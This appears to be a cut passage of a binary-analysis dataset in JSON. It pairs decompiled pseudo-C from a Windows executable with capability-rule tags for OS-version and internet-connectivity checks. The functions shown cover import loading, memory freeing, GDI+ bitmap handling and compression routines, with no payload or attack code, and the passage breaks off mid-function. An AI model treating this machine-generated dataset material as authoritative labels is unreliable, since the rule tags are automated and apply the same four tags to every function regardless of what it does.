        "decompiled_code": "\nvoid __cdecl fcn.00444cc8(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    int32_t *piVar2;\n    uint16_t *puVar3;\n    int32_t iVar4;\n    uint32_t arg_8h_00;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    puVar1 = fcn.00444ba8();\n    if (puVar1[1] != 0) {\n        piVar2 = fcn.00444ad0(*puVar1, 0);\n        while (*piVar2 != 0) {\n            fcn.00444ad0(*piVar2, 0);\n            puVar3 = fcn.00444ad0(8, 0);\n            iVar4 = fcn.0040344c();\n            do {\n                arg_8h_00 = *puVar3 & 0xfff;\n                if (*puVar3 >> 0xc == 3) {\n                    fcn.00444ad0(arg_8h_00, 0);\n                    fcn.00444aa0(arg_8h_00, 0);\n                }\n                puVar3 = puVar3 + 1;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n            fcn.00444aa0(piVar2[1], 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 333
    },
    "00444db4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00444db4(int32_t arg_8h)\n\n{\n    char cVar1;\n    ushort uVar2;\n    uint *puVar3;\n    uint uVar4;\n    int32_t *piVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    int32_t **in_FS_OFFSET;\n    int32_t *in_stack_fffffebc;\n    int32_t *piStack308;\n    uint uStack304;\n    uchar *puStack300;\n    uint var_118h;\n    uint var_112h;\n    int32_t var_10h;\n    int32_t hModule;\n    int32_t *lp;\n    uint var_1h;\n    \n    puStack300 = &var_1h + 1;\n    uStack304 = 0x444ff4;\n    piStack308 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack308;\n    var_1h._0_1_ = 1;\n    puVar3 = fcn.00444ba8();\n    if (puVar3[1] != 0) {\n        lp = fcn.00444ad0(*puVar3, 0);\n        while( true ) {\n            in_stack_fffffebc = lp;\n            iVar7 = sub.kernel32.dll_IsBadReadPtr(lp, 0x14);\n            if ((iVar7 != 0) || (lp[3] == 0)) goto code_r0x00444fdb;\n            fcn.00444ad0(lp[3], 0);\n            uVar4 = fcn.00444b60();\n            hModule = sub.kernel32.dll_LoadLibraryA(uVar4);\n            if (hModule == -1) break;\n            if (*(arg_8h + 8) == 0) {\n                uVar4 = fcn.00402ed8();\n                *(arg_8h + 8) = uVar4;\n            }\n            uVar4 = fcn.00407090(*(arg_8h + 8), (*(arg_8h + 0xc) + 1) * 4);\n            *(arg_8h + 8) = uVar4;\n            if (*(arg_8h + 8) == 0) {\n                fcn.004054c0();\n                var_1h._0_1_ = 0;\n                goto code_r0x00444fdb;\n            }\n            var_10h = *(arg_8h + 0xc) * 4;\n            fcn.00444aa0(var_10h, var_10h >> 0x1f);\n            piVar5 = *(arg_8h + 8);\n            *piVar5 = hModule;\n            piVar5[1] = 0;\n            fcn.00444ab8(var_10h, var_10h >> 0x1f);\n            *(arg_8h + 0xc) = *(arg_8h + 0xc) + 1;\n            if (*lp == 0) {\n                piVar5 = fcn.00444ad0(lp[4], 0);\n            }\n            else {\n                piVar5 = fcn.00444ad0(*lp, 0);\n            }\n            piVar6 = fcn.00444ad0(lp[4], 0);\n            for (; *piVar5 != 0; piVar5 = piVar5 + 1) {\n                cVar1 = fcn.00444bb8();\n                if (cVar1 == '\\0') {\n                    fcn.00444ad0(*piVar5, 0);\n                    fcn.00408460();\n                    iVar7 = sub.kernel32.dll_GetProcAddress_1(hModule, &var_112h + 2);\n                    *piVar6 = iVar7;\n                }\n                else {\n                    uVar2 = fcn.00444bb0();\n                    iVar7 = sub.kernel32.dll_GetProcAddress_1(hModule, uVar2);\n                    *piVar6 = iVar7;\n                }\n                if (*piVar6 == 0) {\n                    fcn.004054c0();\n                    var_1h._0_1_ = 0;\n                    break;\n                }\n                piVar6 = piVar6 + 1;\n            }\n            fcn.00444aa0(0x14, 0);\n        }\n        fcn.00444ad0(lp[3], 0);\n        fcn.00444b60();\n        fcn.00405664();\n        fcn.00405784();\n        var_1h._0_1_ = 0;\n    }\ncode_r0x00444fdb:\n    *in_FS_OFFSET = in_stack_fffffebc;\n    fcn.0040546c(0x444ffb);\n    return;\n}\n",
        "token_count": 1075
    },
    "00445614": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00445614(uint param_1, uint16_t *param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    uint32_t arg_8h;\n    int32_t iVar5;\n    bool bVar6;\n    uint uVar7;\n    \n    puVar1 = fcn.00444ba8(param_2, 0, 0xffffffff);\n    if (puVar1[1] == 0) {\n        uVar7 = 0x44564e;\n        fcn.004054c0();\n    }\n    else {\n        uVar7 = 0;\n        iVar2 = fcn.00444ad0(*puVar1, 0);\n        if ((*(iVar2 + 0x18) == 0) || (*(iVar2 + 0x14) == 0)) {\n            fcn.004054c0();\n        }\n        else {\n            puVar3 = fcn.00444b14();\n            fcn.00444b14();\n            iVar5 = *(iVar2 + 0x18);\n            do {\n                arg_8h = *puVar3;\n                fcn.00444ad0(arg_8h, 0);\n                fcn.00444b60();\n                iVar4 = fcn.0040a86c();\n                if (iVar4 == 0) {\n                    arg_8h = *param_2;\n                    break;\n                }\n                puVar3 = puVar3 + 1;\n                param_2 = param_2 + 1;\n                iVar5 = iVar5 + -1;\n            } while (iVar5 != 0);\n            if (param_2 == 0xffffffff) {\n                fcn.004054c0(arg_8h);\n            }\n            else {\n                bVar6 = param_2 < 0;\n                if (-1 < param_2) {\n                    bVar6 = *(iVar2 + 0x14) + -1 < param_2;\n                }\n                if (bVar6) {\n                    fcn.004054c0(arg_8h);\n                }\n                else {\n                    fcn.00444ad0(param_2 * 4, param_2 * 4 >> 0x1f);\n                    puVar1 = fcn.00444b14();\n                    fcn.00444ad0(*puVar1, puVar1[1]);\n                }\n            }\n        }\n    }\n    return uVar7;\n}\n",
        "token_count": 552
    },
    "00445854": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00445854(void)\n\n{\n    int32_t *in_EAX;\n    code *pcVar1;\n    int32_t iVar2;\n    bool bVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint extraout_var;\n    \n    if ((in_EAX != NULL) && (*(in_EAX + 4) != '\\0')) {\n        uVar4 = *(*in_EAX + 0x28);\n        uVar6 = 0;\n        pcVar1 = fcn.00444ad0(uVar4, 0);\n        (*pcVar1)(in_EAX[1], 0, 0, uVar4, uVar6, extraout_var);\n        *(in_EAX + 4) = 0;\n        iVar2 = in_EAX[3];\n        if (-1 < iVar2 + -1) {\n            iVar5 = 0;\n            do {\n                iVar5 = iVar5 * 4;\n                uVar4 = 0x4458b2;\n                fcn.00444aa0(iVar5, iVar5 >> 0x1f);\n                bVar3 = in_EAX[2][1] == 0;\n                if (bVar3) {\n                    bVar3 = *in_EAX[2] == -1;\n                }\n                if (!bVar3) {\n                    sub.kernel32.dll_FreeLibrary_1(uVar4);\n                }\n                fcn.00444ab8(iVar5, iVar5 >> 0x1f);\n                iVar5 = iVar5 + 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        fcn.00407078(in_EAX[2]);\n        if (in_EAX[1] != 0) {\n            sub.kernel32.dll_VirtualFree_1(in_EAX[1], 0, 0x8000);\n        }\n        uVar4 = sub.kernel32.dll_GetProcessHeap(0);\n        sub.kernel32.dll_HeapFree(uVar4);\n    }\n    return;\n}\n",
        "token_count": 456
    },
    "00445f60": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00445f60(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_DL != '\\0') {\n        puStack40 = 0x445f74;\n        in_EAX = fcn.00404964();\n        in_ECX = extraout_ECX;\n    }\n    puStack40 = 0x445f83;\n    var_4h = in_ECX;\n    fcn.00406fb0();\n    uStack44 = 0x445fde;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    var_8h = 0;\n    if (arg_8h == 0) {\n        puStack40 = &stack0xfffffffc;\n        uVar1 = sub.gdiplus.dll_GdipCreateBitmapFromStream(var_4h, &fcn.00445f60::var_8h);\n        *(in_EAX + 8) = uVar1;\n    }\n    else {\n        puStack40 = &stack0xfffffffc;\n        uVar1 = sub.gdiplus.dll_GdipCreateBitmapFromStreamICM(var_4h, &fcn.00445f60::var_8h);\n        *(in_EAX + 8) = uVar1;\n    }\n    fcn.00445f50();\n    *in_FS_OFFSET = var_4h;\n    uStack48 = 0x445fe5;\n    fcn.00406f3c();\n    return;\n}\n",
        "token_count": 401
    },
    "0044614c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044614c(void)\n\n{\n    uchar *puVar1;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x4461dd;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x4aad90 = *0x4aad90 + 1;\n    if (*0x4aad90 == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (*0x4a2a60 != 0) {\n            fcn.00404640();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        if (*0x4a2a64 != 0) {\n            fcn.00404640();\n        }\n        if (*0x4a2a68 != 0) {\n            fcn.00404640();\n        }\n        if (*0x4a2a6c != 0) {\n            fcn.00404640();\n        }\n        if (*0x4a2a70 != 0) {\n            fcn.00404640();\n        }\n        uStack20 = *0x4aad8c;\n        sub.gdiplus.dll_GdiplusShutdown();\n    }\n    *in_FS_OFFSET = uStack20;\n    return;\n}\n",
        "token_count": 322
    },
    "004461e8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00446234)\n// WARNING: Removing unreachable block (ram,0x00446242)\n// WARNING: Removing unreachable block (ram,0x0044625a)\n// WARNING: Removing unreachable block (ram,0x00446276)\n// WARNING: Removing unreachable block (ram,0x0044628c)\n// WARNING: Removing unreachable block (ram,0x00446290)\n\nvoid fcn.004461e8(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = 0x446204;\n    fcn.004058ec();\n    uStack48 = 0x4462b8;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    fcn.00445e90();\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x4462bf;\n    uStack48 = 0x4462af;\n    fcn.0040546c();\n    uStack48 = 0x4462b7;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 314
    },
    "00446608": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00446608(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_stack_0000eff0;\n    \n    iVar1 = 0x10;\n    do {\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    fcn.00403ae4();\n    fcn.004465d4();\n    fcn.00446604();\n    iVar1 = (**(*in_stack_0000eff0 + 0xc))();\n    while (0 < iVar1) {\n        do {\n            fcn.00447130();\n            fcn.00446604();\n            (**(*param_2 + 0x10))();\n        } while (iVar1 != 0);\n        iVar1 = (**(*in_stack_0000eff0 + 0xc))();\n    }\n    do {\n        fcn.00447130();\n        iVar1 = fcn.00446604();\n        (**(*param_2 + 0x10))();\n    } while (iVar1 != 1);\n    fcn.004473f4();\n    fcn.00446604();\n    return;\n}\n",
        "token_count": 260
    },
    "00446740": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00446740(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_stack_0000eff0;\n    \n    iVar1 = 0x10;\n    do {\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    fcn.00403ae4();\n    fcn.004465ec();\n    fcn.00446604();\n    iVar1 = (**(*in_stack_0000eff0 + 0xc))();\n    while (0 < iVar1) {\n        do {\n            fcn.00448a80();\n            fcn.00446604();\n            (**(*param_2 + 0x10))();\n        } while (iVar1 != 0);\n        iVar1 = (**(*in_stack_0000eff0 + 0xc))();\n    }\n    do {\n        fcn.00448a80();\n        iVar1 = fcn.00446604();\n        (**(*param_2 + 0x10))();\n    } while (iVar1 != 1);\n    fcn.0044993c();\n    fcn.00446604();\n    return;\n}\n",
        "token_count": 261
    },
    "00446b90": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00446b90(int32_t arg_8h, char *arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t *piVar2;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    int32_t iVar3;\n    bool bVar4;\n    uint32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (((arg_ch == NULL) || (*arg_ch != *0x4a2b18)) || (arg_8h != 0x38)) {\n        uVar1 = 0xfffffffa;\n    }\n    else if (in_EAX == 0) {\n        uVar1 = 0xfffffffe;\n    }\n    else {\n        *(in_EAX + 0x18) = 0;\n        if (*(in_EAX + 0x20) == 0) {\n            *(in_EAX + 0x20) = 0x446598;\n            *(in_EAX + 0x28) = 0;\n        }\n        if (*(in_EAX + 0x24) == 0) {\n            *(in_EAX + 0x24) = 0x4465a4;\n        }\n        var_4h = in_EDX;\n        if (in_EDX == -1) {\n            var_4h = 6;\n        }\n        bVar4 = arg_18h < 0;\n        if (bVar4) {\n            arg_18h = -arg_18h;\n        }\n        var_ch = !bVar4;\n        if (((((arg_14h < 1) || (9 < arg_14h)) || ((in_ECX != 8 || ((arg_18h < 8 || (0xf < arg_18h)))))) || (var_4h < 0)\n            ) || (((9 < var_4h || (arg_10h < 0)) || (4 < arg_10h)))) {\n            uVar1 = 0xfffffffe;\n        }\n        else {\n            if (arg_18h == 8) {\n                arg_18h = 9;\n            }\n            piVar2 = (**(in_EAX + 0x20))();\n            if (piVar2 == NULL) {\n                uVar1 = 0xfffffffc;\n            }\n            else {\n                *(in_EAX + 0x1c) = piVar2;\n                *piVar2 = in_EAX;\n                piVar2[6] = var_ch;\n                piVar2[0xb] = arg_18h;\n                iVar3 = 1 << (arg_18h & 0x1f);\n                piVar2[10] = iVar3;\n                piVar2[0xc] = iVar3 + -1;\n                piVar2[0x13] = arg_14h + 7;\n                iVar3 = 1 << (arg_14h + 7 & 0x1f);\n                piVar2[0x12] = iVar3;\n                piVar2[0x14] = iVar3 + -1;\n                piVar2[0x15] = (piVar2[0x13] + 2U) / 3;\n                iVar3 = (**(in_EAX + 0x20))();\n                piVar2[0xd] = iVar3;\n                iVar3 = (**(in_EAX + 0x20))();\n                piVar2[0xf] = iVar3;\n                iVar3 = (**(in_EAX + 0x20))();\n                piVar2[0x10] = iVar3;\n                piVar2[0x5a6] = 1 << (arg_14h + 6U & 0x1f);\n                iVar3 = (**(in_EAX + 0x20))();\n                piVar2[2] = iVar3;\n                piVar2[3] = piVar2[0x5a6] << 2;\n                if (((piVar2[0xd] == 0) || (piVar2[0xf] == 0)) || ((piVar2[0x10] == 0 || (piVar2[2] == 0)))) {\n                    piVar2[1] = 0x29a;\n                    *(in_EAX + 0x18) = *0x4a2a8c;\n                    fcn.004473f4();\n                    uVar1 = 0xfffffffc;\n                }\n                else {\n                    piVar2[0x5a8] = iVar3 + (piVar2[0x5a6] & 0xfffffffeU);\n                    piVar2[0x5a5] = piVar2[0x5a6] * 3 + piVar2[2];\n                    piVar2[0x20] = var_4h;\n                    piVar2[0x21] = arg_10h;\n                    *(piVar2 + 8) = 8;\n                    uVar1 = fcn.00446eac();\n                }\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 1158
    },
    "00446eac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00446eac(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    if ((((in_EAX != 0) && (*(in_EAX + 0x1c) != 0)) && (*(in_EAX + 0x20) != 0)) && (*(in_EAX + 0x24) != 0)) {\n        *(in_EAX + 0x14) = 0;\n        *(in_EAX + 8) = 0;\n        *(in_EAX + 0x18) = 0;\n        *(in_EAX + 0x2c) = 2;\n        iVar1 = *(in_EAX + 0x1c);\n        *(iVar1 + 0x14) = 0;\n        *(iVar1 + 0x10) = *(iVar1 + 8);\n        if (*(iVar1 + 0x18) < 0) {\n            *(iVar1 + 0x18) = -*(iVar1 + 0x18);\n        }\n        if (*(iVar1 + 0x18) == 0) {\n            uVar2 = 0x71;\n        }\n        else {\n            uVar2 = 0x2a;\n        }\n        *(iVar1 + 4) = uVar2;\n        uVar2 = fcn.0044686c();\n        *(in_EAX + 0x30) = uVar2;\n        *(iVar1 + 0x24) = 0;\n        fcn.0044a120();\n        fcn.0044768c();\n        return 0;\n    }\n    return 0xfffffffe;\n}\n",
        "token_count": 369
    },
    "0044703c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044703c(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint in_ECX;\n    uint in_EDX;\n    \n    if ((in_EAX == 0) || (*(in_EAX + 0x1c) == 0)) {\n        uVar2 = 0xfffffffe;\n    }\n    else {\n        iVar1 = *(in_EAX + 0x1c);\n        *(iVar1 + 0x88) = in_EDX;\n        *(iVar1 + 0x7c) = in_ECX;\n        *(iVar1 + 0x8c) = arg_ch;\n        *(iVar1 + 0x78) = arg_8h;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 192
    },
    "004470dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004470dc(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    uint32_t arg_10h;\n    \n    arg_10h = *(*(in_EAX + 0x1c) + 0x14);\n    if (*(in_EAX + 0x10) < arg_10h) {\n        arg_10h = *(in_EAX + 0x10);\n    }\n    if (arg_10h != 0) {\n        fcn.004465c0(*(in_EAX + 0xc), *(*(in_EAX + 0x1c) + 0x10), arg_10h);\n        *(in_EAX + 0xc) = *(in_EAX + 0xc) + arg_10h;\n        piVar1 = *(in_EAX + 0x1c) + 0x10;\n        *piVar1 = *piVar1 + arg_10h;\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + arg_10h;\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) - arg_10h;\n        piVar1 = *(in_EAX + 0x1c) + 0x14;\n        *piVar1 = *piVar1 - arg_10h;\n        iVar2 = *(in_EAX + 0x1c);\n        if (*(iVar2 + 0x14) == 0) {\n            *(iVar2 + 0x10) = *(iVar2 + 8);\n        }\n    }\n    return;\n}\n",
        "token_count": 373
    },
    "00447130": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00447130(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t *in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    \n    if ((((in_EAX == NULL) || (in_EAX[7] == 0)) || (4 < param_2)) || (param_2 < 0)) {\n        uVar3 = 0xfffffffe;\n    }\n    else {\n        ppiVar1 = in_EAX[7];\n        if (((in_EAX[3] == 0) || ((*in_EAX == 0 && (in_EAX[1] != 0)))) || ((ppiVar1[1] == 0x29a && (param_2 != 0x4)))) {\n            in_EAX[6] = *0x4a2a84;\n            uVar3 = 0xfffffffe;\n        }\n        else if (in_EAX[4] == 0) {\n            uVar3 = 0xfffffffb;\n            in_EAX[6] = *0x4a2a90;\n        }\n        else {\n            *ppiVar1 = in_EAX;\n            piVar2 = ppiVar1[9];\n            ppiVar1[9] = param_2;\n            if (ppiVar1[1] == 0x2a) {\n                ppiVar1[1] = 0x71;\n                fcn.004470b4();\n                if (ppiVar1[0x1a] != NULL) {\n                    fcn.004470b4();\n                    fcn.004470b4();\n                }\n                iVar4 = fcn.0044686c();\n                in_EAX[0xc] = iVar4;\n            }\n            if (ppiVar1[5] == NULL) {\n                if (((in_EAX[1] == 0) && (param_2 <= piVar2)) && (param_2 != 0x4)) {\n                    uVar3 = 0xfffffffb;\n                    in_EAX[6] = *0x4a2a90;\n                    goto code_r0x004473eb;\n                }\n            }\n            else {\n                fcn.004470dc();\n                if (in_EAX[4] == 0) {\n                    ppiVar1[9] = 0xffffffff;\n                    uVar3 = 0;\n                    goto code_r0x004473eb;\n                }\n            }\n            if ((ppiVar1[1] == 0x29a) && (in_EAX[1] != 0)) {\n                uVar3 = 0xfffffffb;\n                in_EAX[6] = *0x4a2a90;\n            }\n            else {\n                if (((in_EAX[1] != 0) || (ppiVar1[0x1c] != NULL)) || ((param_2 != NULL && (ppiVar1[1] != 0x29a)))) {\n                    param_1 = (**(ppiVar1[0x20] * 0xc + 0x4a2aa8))();\n                    if ((param_1 == 2) || (param_1 == 3)) {\n                        ppiVar1[1] = 0x29a;\n                    }\n                    if ((param_1 == 0) || (param_1 == 2)) {\n                        if (in_EAX[4] == 0) {\n                            ppiVar1[9] = 0xffffffff;\n                        }\n                        uVar3 = 0;\n                        goto code_r0x004473eb;\n                    }\n                    if (param_1 == 1) {\n                        if (param_2 == 0x1) {\n                            fcn.0044b31c();\n                        }\n                        else {\n                            param_1 = 0;\n                            fcn.0044b260(0);\n                            if (param_2 == 0x3) {\n                                *(ppiVar1[0x10] + ppiVar1[0x12] * 2 + -2) = 0;\n                                fcn.004465ac(ppiVar1[0x10], 0, (ppiVar1[0x12] + -1) * 2);\n                            }\n                        }\n                        fcn.004470dc();\n                        if (in_EAX[4] == 0) {\n                            ppiVar1[9] = 0xffffffff;\n                            uVar3 = 0;\n                            goto code_r0x004473eb;\n                        }\n                    }\n                }\n                if (param_2 == 0x4) {\n                    if (ppiVar1[6] < 1) {\n                        uVar3 = 1;\n                    }\n                    else {\n                        fcn.004470b4();\n                        fcn.004470b4();\n                        fcn.004470dc();\n                        if (0 < ppiVar1[6]) {\n                            ppiVar1[6] = -ppiVar1[6];\n                        }\n                        if (ppiVar1[5] == NULL) {\n                            uVar3 = 1;\n                        }\n                        else {\n                            uVar3 = 0;\n                        }\n                    }\n                }\n                else {\n                    uVar3 = 0;\n                }\n            }\n        }\n    }\ncode_r0x004473eb:\n    return CONCAT44(param_1, uVar3);\n}\n",
        "token_count": 1178
    },
    "004473f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004473f4(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    if ((in_EAX == 0) || (*(in_EAX + 0x1c) == 0)) {\n        return 0xfffffffe;\n    }\n    iVar1 = *(*(in_EAX + 0x1c) + 4);\n    if (((iVar1 != 0x2a) && (((iVar1 != 0x45 && (iVar1 != 0x49)) && (iVar1 != 0x5b)))) &&\n       (((iVar1 != 0x67 && (iVar1 != 0x71)) && (iVar1 != 0x29a)))) {\n        return 0xfffffffe;\n    }\n    if (*(*(in_EAX + 0x1c) + 8) != 0) {\n        (**(in_EAX + 0x24))();\n    }\n    if (*(*(in_EAX + 0x1c) + 0x40) != 0) {\n        (**(in_EAX + 0x24))();\n    }\n    if (*(*(in_EAX + 0x1c) + 0x3c) != 0) {\n        (**(in_EAX + 0x24))();\n    }\n    if (*(*(in_EAX + 0x1c) + 0x34) != 0) {\n        (**(in_EAX + 0x24))();\n    }\n    (**(in_EAX + 0x24))();\n    *(in_EAX + 0x1c) = 0;\n    if (iVar1 == 0x71) {\n        uVar2 = 0xfffffffd;\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 405
    },
    "00447950": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00447950(uint32_t param_1)\n\n{\n    uint8_t uVar1;\n    uint32_t arg_10h;\n    int32_t *in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint16_t uVar4;\n    uint16_t *puVar5;\n    \n    arg_10h = in_EAX[10];\n    while( true ) {\n        uVar2 = in_EAX[10] + -0x106 + arg_10h;\n        if (uVar2 < in_EAX[0x1a] || uVar2 == in_EAX[0x1a]) {\n            fcn.004465c0(in_EAX[0xd], in_EAX[0xd] + arg_10h, arg_10h);\n            in_EAX[0x1b] = in_EAX[0x1b] - arg_10h;\n            in_EAX[0x1a] = in_EAX[0x1a] - arg_10h;\n            in_EAX[0x16] = in_EAX[0x16] - arg_10h;\n            iVar3 = in_EAX[0x12];\n            puVar5 = iVar3 * 2 + in_EAX[0x10];\n            do {\n                puVar5 = puVar5 + -1;\n                if (*puVar5 < arg_10h) {\n                    uVar4 = 0;\n                }\n                else {\n                    uVar4 = *puVar5 - arg_10h;\n                }\n                *puVar5 = uVar4;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n            puVar5 = arg_10h * 2 + in_EAX[0xf];\n            uVar2 = arg_10h;\n            do {\n                puVar5 = puVar5 + -1;\n                param_1 = *puVar5;\n                if (param_1 < arg_10h) {\n                    uVar4 = 0;\n                }\n                else {\n                    uVar4 = *puVar5 - arg_10h;\n                }\n                *puVar5 = uVar4;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        if (*(*in_EAX + 4) == 0) break;\n        iVar3 = fcn.00447640(param_1);\n        in_EAX[0x1c] = in_EAX[0x1c] + iVar3;\n        if (2 < in_EAX[0x1c]) {\n            uVar1 = *(in_EAX[0xd] + in_EAX[0x1a]);\n            in_EAX[0x11] = uVar1;\n            